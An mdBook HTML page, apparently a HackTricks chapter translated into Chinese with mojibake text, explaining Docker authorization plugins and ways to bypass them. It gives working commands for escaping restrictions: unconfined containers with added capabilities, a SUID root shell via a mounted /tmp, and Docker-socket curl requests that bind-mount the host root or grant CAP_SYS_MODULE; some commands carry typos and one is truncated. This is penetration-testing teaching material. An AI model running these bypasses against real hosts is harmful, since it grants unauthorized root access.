<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>AuthZ&amp; AuthN - Docker Access Authorization Plugin</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<p><strong>Docker</strong> çš„å¼€ç®±å³ç”¨ <strong>æˆæƒ</strong> æ¨¡å‹æ˜¯ <strong>å…¨æœ‰æˆ–å…¨æ— </strong>ã€‚ä»»ä½•æœ‰æƒé™è®¿é—® Docker å®ˆæŠ¤è¿›ç¨‹çš„ç”¨æˆ·éƒ½å¯ä»¥ <strong>è¿è¡Œä»»ä½•</strong> Docker å®¢æˆ·ç«¯ <strong>å‘½ä»¤</strong>ã€‚ä½¿ç”¨ Docker çš„å¼•æ“ API è”ç³»å®ˆæŠ¤è¿›ç¨‹çš„è°ƒç”¨è€…ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¦‚æœæ‚¨éœ€è¦ <strong>æ›´ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶</strong>ï¼Œå¯ä»¥åˆ›å»º <strong>æˆæƒæ’ä»¶</strong> å¹¶å°†å…¶æ·»åŠ åˆ° Docker å®ˆæŠ¤è¿›ç¨‹é…ç½®ä¸­ã€‚ä½¿ç”¨æˆæƒæ’ä»¶ï¼ŒDocker ç®¡ç†å‘˜å¯ä»¥ <strong>é…ç½®ç»†ç²’åº¦è®¿é—®</strong> ç­–ç•¥æ¥ç®¡ç†å¯¹ Docker å®ˆæŠ¤è¿›ç¨‹çš„è®¿é—®ã€‚</p>
<h1 id="åŸºæœ¬æ¶æ„"><a class="header" href="#åŸºæœ¬æ¶æ„">åŸºæœ¬æ¶æ„</a></h1>
<p>Docker Auth æ’ä»¶æ˜¯ <strong>å¤–éƒ¨</strong> <strong>æ’ä»¶</strong>ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥ <strong>å…è®¸/æ‹’ç»</strong> <strong>è¯·æ±‚</strong> Docker å®ˆæŠ¤è¿›ç¨‹çš„ <strong>æ“ä½œ</strong>ï¼Œå…·ä½“å–å†³äºè¯·æ±‚çš„ <strong>ç”¨æˆ·</strong> å’Œ <strong>è¯·æ±‚çš„æ“ä½œ</strong>ã€‚</p>
<p><strong><a href="https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon">ä»¥ä¸‹ä¿¡æ¯æ¥è‡ªæ–‡æ¡£</a></strong></p>
<p>å½“é€šè¿‡ CLI æˆ–å¼•æ“ API å‘ Docker <strong>å®ˆæŠ¤è¿›ç¨‹</strong> å‘å‡º <strong>HTTP</strong> <strong>è¯·æ±‚</strong> æ—¶ï¼Œ<strong>èº«ä»½éªŒè¯</strong> <strong>å­ç³»ç»Ÿ</strong> ä¼šå°†è¯·æ±‚ä¼ é€’ç»™å·²å®‰è£…çš„ <strong>èº«ä»½éªŒè¯</strong> <strong>æ’ä»¶</strong>ã€‚è¯·æ±‚åŒ…å«ç”¨æˆ·ï¼ˆè°ƒç”¨è€…ï¼‰å’Œå‘½ä»¤ä¸Šä¸‹æ–‡ã€‚<strong>æ’ä»¶</strong> è´Ÿè´£å†³å®šæ˜¯å¦ <strong>å…è®¸</strong> æˆ– <strong>æ‹’ç»</strong> è¯·æ±‚ã€‚</p>
<p>ä¸‹é¢çš„åºåˆ—å›¾æç»˜äº†å…è®¸å’Œæ‹’ç»çš„æˆæƒæµç¨‹ï¼š</p>
<p><img src="https://docs.docker.com/engine/extend/images/authz_allow.png" alt="Authorization Allow flow" /></p>
<p><img src="https://docs.docker.com/engine/extend/images/authz_deny.png" alt="Authorization Deny flow" /></p>
<p>æ¯ä¸ªå‘é€åˆ°æ’ä»¶çš„è¯·æ±‚ <strong>åŒ…æ‹¬ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ã€HTTP å¤´å’Œè¯·æ±‚/å“åº”ä¸»ä½“</strong>ã€‚åªæœ‰ <strong>ç”¨æˆ·å</strong> å’Œ <strong>ä½¿ç”¨çš„èº«ä»½éªŒè¯æ–¹æ³•</strong> è¢«ä¼ é€’ç»™æ’ä»¶ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œ<strong>ä¸</strong> ä¼šä¼ é€’ç”¨æˆ· <strong>å‡­æ®</strong> æˆ–ä»¤ç‰Œã€‚æœ€åï¼Œ<strong>å¹¶éæ‰€æœ‰è¯·æ±‚/å“åº”ä¸»ä½“éƒ½å‘é€</strong> åˆ°æˆæƒæ’ä»¶ã€‚åªæœ‰å½“ <code>Content-Type</code> ä¸º <code>text/*</code> æˆ– <code>application/json</code> æ—¶ï¼Œæ‰ä¼šå‘é€è¯·æ±‚/å“åº”ä¸»ä½“ã€‚</p>
<p>å¯¹äºå¯èƒ½åŠ«æŒ HTTP è¿æ¥çš„å‘½ä»¤ï¼ˆ<code>HTTP Upgrade</code>ï¼‰ï¼Œä¾‹å¦‚ <code>exec</code>ï¼Œæˆæƒæ’ä»¶ä»…åœ¨åˆå§‹ HTTP è¯·æ±‚æ—¶è¢«è°ƒç”¨ã€‚ä¸€æ—¦æ’ä»¶æ‰¹å‡†å‘½ä»¤ï¼Œåç»­æµç¨‹ä¸å†åº”ç”¨æˆæƒã€‚å…·ä½“æ¥è¯´ï¼Œæµæ•°æ®ä¸ä¼šä¼ é€’ç»™æˆæƒæ’ä»¶ã€‚å¯¹äºè¿”å›åˆ†å— HTTP å“åº”çš„å‘½ä»¤ï¼Œä¾‹å¦‚ <code>logs</code> å’Œ <code>events</code>ï¼Œä»…å°† HTTP è¯·æ±‚å‘é€åˆ°æˆæƒæ’ä»¶ã€‚</p>
<p>åœ¨è¯·æ±‚/å“åº”å¤„ç†è¿‡ç¨‹ä¸­ï¼Œä¸€äº›æˆæƒæµç¨‹å¯èƒ½éœ€è¦å¯¹ Docker å®ˆæŠ¤è¿›ç¨‹è¿›è¡Œé¢å¤–æŸ¥è¯¢ã€‚ä¸ºäº†å®Œæˆè¿™äº›æµç¨‹ï¼Œæ’ä»¶å¯ä»¥åƒæ™®é€šç”¨æˆ·ä¸€æ ·è°ƒç”¨å®ˆæŠ¤è¿›ç¨‹ APIã€‚ä¸ºäº†å¯ç”¨è¿™äº›é¢å¤–æŸ¥è¯¢ï¼Œæ’ä»¶å¿…é¡»æä¾›ç®¡ç†å‘˜é…ç½®é€‚å½“èº«ä»½éªŒè¯å’Œå®‰å…¨ç­–ç•¥çš„æ‰‹æ®µã€‚</p>
<h2 id="å¤šä¸ªæ’ä»¶"><a class="header" href="#å¤šä¸ªæ’ä»¶">å¤šä¸ªæ’ä»¶</a></h2>
<p>æ‚¨è´Ÿè´£å°† <strong>æ’ä»¶</strong> æ³¨å†Œä¸º Docker å®ˆæŠ¤è¿›ç¨‹ <strong>å¯åŠ¨</strong> çš„ä¸€éƒ¨åˆ†ã€‚æ‚¨å¯ä»¥å®‰è£… <strong>å¤šä¸ªæ’ä»¶å¹¶å°†å®ƒä»¬é“¾æ¥åœ¨ä¸€èµ·</strong>ã€‚æ­¤é“¾å¯ä»¥æŒ‰é¡ºåºæ’åˆ—ã€‚æ¯ä¸ªå¯¹å®ˆæŠ¤è¿›ç¨‹çš„è¯·æ±‚æŒ‰é¡ºåºé€šè¿‡é“¾ã€‚åªæœ‰å½“ <strong>æ‰€æœ‰æ’ä»¶éƒ½æˆäºˆè®¿é—®æƒé™</strong> æ—¶ï¼Œè®¿é—®æ‰ä¼šè¢«æˆäºˆã€‚</p>
<h1 id="æ’ä»¶ç¤ºä¾‹"><a class="header" href="#æ’ä»¶ç¤ºä¾‹">æ’ä»¶ç¤ºä¾‹</a></h1>
<h2 id="twistlock-authz-broker"><a class="header" href="#twistlock-authz-broker">Twistlock AuthZ Broker</a></h2>
<p>æ’ä»¶ <a href="https://github.com/twistlock/authz"><strong>authz</strong></a> å…è®¸æ‚¨åˆ›å»ºä¸€ä¸ªç®€å•çš„ <strong>JSON</strong> æ–‡ä»¶ï¼Œæ’ä»¶å°† <strong>è¯»å–</strong> è¯¥æ–‡ä»¶ä»¥æˆæƒè¯·æ±‚ã€‚å› æ­¤ï¼Œå®ƒä½¿æ‚¨èƒ½å¤Ÿéå¸¸è½»æ¾åœ°æ§åˆ¶æ¯ä¸ªç”¨æˆ·å¯ä»¥è®¿é—®å“ªäº› API ç«¯ç‚¹ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå…è®¸ Alice å’Œ Bob åˆ›å»ºæ–°å®¹å™¨ï¼š<code>{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}</code></p>
<p>åœ¨é¡µé¢ <a href="https://github.com/twistlock/authz/blob/master/core/route_parser.go">route_parser.go</a> ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è¯·æ±‚çš„ URL ä¸æ“ä½œä¹‹é—´çš„å…³ç³»ã€‚åœ¨é¡µé¢ <a href="https://github.com/twistlock/authz/blob/master/core/types.go">types.go</a> ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æ“ä½œåç§°ä¸æ“ä½œä¹‹é—´çš„å…³ç³»ã€‚</p>
<h2 id="ç®€å•æ’ä»¶æ•™ç¨‹"><a class="header" href="#ç®€å•æ’ä»¶æ•™ç¨‹">ç®€å•æ’ä»¶æ•™ç¨‹</a></h2>
<p>æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ª <strong>æ˜“äºç†è§£çš„æ’ä»¶</strong>ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³å®‰è£…å’Œè°ƒè¯•çš„è¯¦ç»†ä¿¡æ¯ï¼š<a href="https://github.com/carlospolop-forks/authobot"><strong>https://github.com/carlospolop-forks/authobot</strong></a></p>
<p>é˜…è¯» <code>README</code> å’Œ <code>plugin.go</code> ä»£ç ä»¥äº†è§£å…¶å·¥ä½œåŸç†ã€‚</p>
<h1 id="docker-auth-æ’ä»¶ç»•è¿‡"><a class="header" href="#docker-auth-æ’ä»¶ç»•è¿‡">Docker Auth æ’ä»¶ç»•è¿‡</a></h1>
<h2 id="æšä¸¾è®¿é—®"><a class="header" href="#æšä¸¾è®¿é—®">æšä¸¾è®¿é—®</a></h2>
<p>ä¸»è¦æ£€æŸ¥çš„å†…å®¹æ˜¯ <strong>å…è®¸å“ªäº›ç«¯ç‚¹</strong> å’Œ <strong>å…è®¸å“ªäº› HostConfig çš„å€¼</strong>ã€‚</p>
<p>è¦æ‰§è¡Œæ­¤æšä¸¾ï¼Œæ‚¨å¯ä»¥ <strong>ä½¿ç”¨å·¥å…·</strong> <a href="https://github.com/carlospolop/docker_auth_profiler"><strong>https://github.com/carlospolop/docker_auth_profiler</strong></a><strong>.</strong></p>
<h2 id="ä¸å…è®¸çš„-run---privileged"><a class="header" href="#ä¸å…è®¸çš„-run---privileged">ä¸å…è®¸çš„ <code>run --privileged</code></a></h2>
<h3 id="æœ€å°æƒé™"><a class="header" href="#æœ€å°æƒé™">æœ€å°æƒé™</a></h3>
<pre><code class="language-bash">docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
</code></pre>
<h3 id="è¿è¡Œå®¹å™¨å¹¶è·å¾—ç‰¹æƒä¼šè¯"><a class="header" href="#è¿è¡Œå®¹å™¨å¹¶è·å¾—ç‰¹æƒä¼šè¯">è¿è¡Œå®¹å™¨å¹¶è·å¾—ç‰¹æƒä¼šè¯</a></h3>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç®¡ç†å‘˜<strong>ä¸å…è®¸ç”¨æˆ·æŒ‚è½½å·å¹¶ä½¿ç”¨ <code>--privileged</code> æ ‡å¿—è¿è¡Œå®¹å™¨</strong>æˆ–ç»™äºˆå®¹å™¨ä»»ä½•é¢å¤–çš„èƒ½åŠ›ï¼š</p>
<pre><code class="language-bash">docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
</code></pre>
<p>ç„¶è€Œï¼Œç”¨æˆ·å¯ä»¥<strong>åœ¨è¿è¡Œä¸­çš„å®¹å™¨å†…åˆ›å»ºä¸€ä¸ª shell å¹¶èµ‹äºˆå®ƒé¢å¤–çš„æƒé™</strong>ï¼š</p>
<pre><code class="language-bash">docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
</code></pre>
<p>ç°åœ¨ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ä»»ä½•<a href="./#privileged-flag"><strong>ä¹‹å‰è®¨è®ºè¿‡çš„æŠ€æœ¯</strong></a>ä»å®¹å™¨ä¸­é€ƒè„±ï¼Œå¹¶åœ¨ä¸»æœºå†…éƒ¨<strong>æå‡æƒé™</strong>ã€‚</p>
<h2 id="æŒ‚è½½å¯å†™æ–‡ä»¶å¤¹"><a class="header" href="#æŒ‚è½½å¯å†™æ–‡ä»¶å¤¹">æŒ‚è½½å¯å†™æ–‡ä»¶å¤¹</a></h2>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç®¡ç†å‘˜<strong>ä¸å…è®¸ç”¨æˆ·ä½¿ç”¨<code>--privileged</code>æ ‡å¿—è¿è¡Œå®¹å™¨</strong>æˆ–ç»™å®¹å™¨æä¾›ä»»ä½•é¢å¤–çš„èƒ½åŠ›ï¼Œä»–åªå…è®¸æŒ‚è½½<code>/tmp</code>æ–‡ä»¶å¤¹ï¼š</p>
<pre><code class="language-bash">host&gt; cp /bin/bash /tmp #Cerate a copy of bash
host&gt; docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container&gt; chown root:root /host/bash
docker container&gt; chmod u+s /host/bash
host&gt; /tmp/bash
-p #This will give you a shell as root
</code></pre>
<p>{% hint style="info" %}
æ³¨æ„ï¼Œæ‚¨å¯èƒ½æ— æ³•æŒ‚è½½æ–‡ä»¶å¤¹ <code>/tmp</code>ï¼Œä½†æ‚¨å¯ä»¥æŒ‚è½½ä¸€ä¸ª <strong>ä¸åŒçš„å¯å†™æ–‡ä»¶å¤¹</strong>ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾å¯å†™ç›®å½•ï¼š<code>find / -writable -type d 2&gt;/dev/null</code></p>
<p><strong>æ³¨æ„ï¼Œå¹¶éæ‰€æœ‰ Linux æœºå™¨ä¸Šçš„ç›®å½•éƒ½æ”¯æŒ suid ä½ï¼</strong> è¦æ£€æŸ¥å“ªäº›ç›®å½•æ”¯æŒ suid ä½ï¼Œè¯·è¿è¡Œ <code>mount | grep -v "nosuid"</code>ã€‚ä¾‹å¦‚ï¼Œé€šå¸¸ <code>/dev/shm</code>ã€<code>/run</code>ã€<code>/proc</code>ã€<code>/sys/fs/cgroup</code> å’Œ <code>/var/lib/lxcfs</code> ä¸æ”¯æŒ suid ä½ã€‚</p>
<p>è¿˜è¦æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯ä»¥ <strong>æŒ‚è½½ <code>/etc</code></strong> æˆ–ä»»ä½•å…¶ä»– <strong>åŒ…å«é…ç½®æ–‡ä»¶</strong> çš„æ–‡ä»¶å¤¹ï¼Œæ‚¨å¯ä»¥åœ¨ docker å®¹å™¨ä¸­ä»¥ root èº«ä»½æ›´æ”¹å®ƒä»¬ï¼Œä»¥ä¾¿ <strong>åœ¨ä¸»æœºä¸­æ»¥ç”¨å®ƒä»¬</strong> å¹¶æå‡æƒé™ï¼ˆå¯èƒ½ä¿®æ”¹ <code>/etc/shadow</code>ï¼‰ã€‚
{% endhint %}</p>
<h2 id="æœªæ£€æŸ¥çš„-api-ç«¯ç‚¹"><a class="header" href="#æœªæ£€æŸ¥çš„-api-ç«¯ç‚¹">æœªæ£€æŸ¥çš„ API ç«¯ç‚¹</a></h2>
<p>é…ç½®æ­¤æ’ä»¶çš„ç³»ç»Ÿç®¡ç†å‘˜çš„è´£ä»»æ˜¯æ§åˆ¶æ¯ä¸ªç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„æ“ä½œåŠå…¶æƒé™ã€‚å› æ­¤ï¼Œå¦‚æœç®¡ç†å‘˜å¯¹ç«¯ç‚¹å’Œå±æ€§é‡‡å– <strong>é»‘åå•</strong> æ–¹æ³•ï¼Œä»–å¯èƒ½ä¼š <strong>å¿˜è®°å…¶ä¸­ä¸€äº›</strong>ï¼Œè¿™å¯èƒ½å…è®¸æ”»å‡»è€… <strong>æå‡æƒé™</strong>ã€‚</p>
<p>æ‚¨å¯ä»¥åœ¨ <a href="https://docs.docker.com/engine/api/v1.40/#">https://docs.docker.com/engine/api/v1.40/#</a> æ£€æŸ¥ docker APIã€‚</p>
<h2 id="æœªæ£€æŸ¥çš„-json-ç»“æ„"><a class="header" href="#æœªæ£€æŸ¥çš„-json-ç»“æ„">æœªæ£€æŸ¥çš„ JSON ç»“æ„</a></h2>
<h3 id="åœ¨æ ¹ç›®å½•ä¸­çš„ç»‘å®š"><a class="header" href="#åœ¨æ ¹ç›®å½•ä¸­çš„ç»‘å®š">åœ¨æ ¹ç›®å½•ä¸­çš„ç»‘å®š</a></h3>
<p>å¯èƒ½åœ¨ç³»ç»Ÿç®¡ç†å‘˜é…ç½® docker é˜²ç«å¢™æ—¶ï¼Œä»– <strong>å¿˜è®°äº†ä¸€äº›é‡è¦å‚æ•°</strong>ï¼Œä¾‹å¦‚ <a href="https://docs.docker.com/engine/api/v1.40/#operation/ContainerList"><strong>API</strong></a> ä¸­çš„ "<strong>Binds</strong>"ã€‚<br />
åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œå¯ä»¥åˆ©ç”¨æ­¤é”™è¯¯é…ç½®åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªæŒ‚è½½ä¸»æœºæ ¹ç›®å½•ï¼ˆ/ï¼‰çš„å®¹å™¨ï¼š</p>
<pre><code class="language-bash">docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
</code></pre>
<p>{% hint style="warning" %}
æ³¨æ„åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°† <strong><code>Binds</code></strong> å‚æ•°ä½œä¸º JSON çš„æ ¹çº§é”®ä½¿ç”¨ï¼Œä½†åœ¨ API ä¸­å®ƒå‡ºç°åœ¨ <strong><code>HostConfig</code></strong> é”®ä¸‹ã€‚
{% endhint %}</p>
<h3 id="hostconfig-ä¸­çš„-binds"><a class="header" href="#hostconfig-ä¸­çš„-binds">HostConfig ä¸­çš„ Binds</a></h3>
<p>æŒ‰ç…§ä¸ <strong>æ ¹ä¸­çš„ Binds</strong> ç›¸åŒçš„è¯´æ˜ï¼Œå‘ Docker API æ‰§è¡Œæ­¤ <strong>è¯·æ±‚</strong>ï¼š</p>
<pre><code class="language-bash">curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
</code></pre>
<h3 id="mounts-in-root"><a class="header" href="#mounts-in-root">Mounts in root</a></h3>
<p>æŒ‰ç…§ä¸ <strong>Binds in root</strong> ç›¸åŒçš„æŒ‡ç¤ºï¼Œå‘ Docker API æ‰§è¡Œæ­¤ <strong>request</strong>ï¼š</p>
<pre><code class="language-bash">curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
</code></pre>
<h3 id="mounts-in-hostconfig"><a class="header" href="#mounts-in-hostconfig">Mounts in HostConfig</a></h3>
<p>æŒ‰ç…§ä¸ <strong>Binds in root</strong> ç›¸åŒçš„æŒ‡ç¤ºï¼Œå‘ Docker API æ‰§è¡Œæ­¤ <strong>è¯·æ±‚</strong>ï¼š</p>
<pre><code class="language-bash">curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
</code></pre>
<h2 id="æœªæ£€æŸ¥çš„-json-å±æ€§"><a class="header" href="#æœªæ£€æŸ¥çš„-json-å±æ€§">æœªæ£€æŸ¥çš„ JSON å±æ€§</a></h2>
<p>ç³»ç»Ÿç®¡ç†å‘˜åœ¨é…ç½® docker é˜²ç«å¢™æ—¶ï¼Œ<strong>å¯èƒ½å¿˜è®°äº†æŸä¸ªå‚æ•°çš„é‡è¦å±æ€§</strong>ï¼Œä¾‹å¦‚ <a href="https://docs.docker.com/engine/api/v1.40/#operation/ContainerList"><strong>API</strong></a> ä¸­çš„ "<strong>Capabilities</strong>" åœ¨ "<strong>HostConfig</strong>" å†…ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œå¯ä»¥åˆ©ç”¨æ­¤é”™è¯¯é…ç½®åˆ›å»ºå¹¶è¿è¡Œå…·æœ‰ <strong>SYS_MODULE</strong> èƒ½åŠ›çš„å®¹å™¨ï¼š</p>
<pre><code class="language-bash">docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
</code></pre>
<p>{% hint style="info" %}
